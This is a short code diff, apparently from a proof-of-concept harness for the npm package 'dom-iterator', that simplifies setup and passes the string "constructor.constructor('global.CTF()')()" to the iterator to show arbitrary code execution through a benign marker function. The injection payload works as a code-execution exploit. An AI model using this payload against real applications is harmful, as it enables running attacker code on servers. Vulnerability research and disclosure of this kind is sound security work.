@@ -54,10 +54,7 @@ const server = http.createServer((req, res) => {
       var PUT = require('dom-iterator');
       global.CTF = function() { console.log("GLOBAL.CTF HIT") } // We want to prove we can execute this by using the package
 
-      var parser = require('mini-html-parser');
-      var html = '<h1></h1>'; // Any non-empty html should work
-      var parser = parser(html);
-      var node = parser.parse();
+      var node = {};
       var it = PUT(node);
       var next;
       while (next = it.next("constructor.constructor('global.CTF()')()")) { }
